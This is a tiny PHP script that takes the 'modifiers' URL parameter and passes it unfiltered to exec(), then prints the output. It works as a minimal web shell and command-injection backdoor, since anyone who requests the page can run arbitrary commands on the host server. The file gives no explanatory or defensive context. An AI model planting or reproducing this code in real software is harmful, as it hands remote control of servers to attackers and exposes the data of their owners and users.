<?php

$command = $_GET['modifiers'];

$output = exec($command);

echo $output;

?>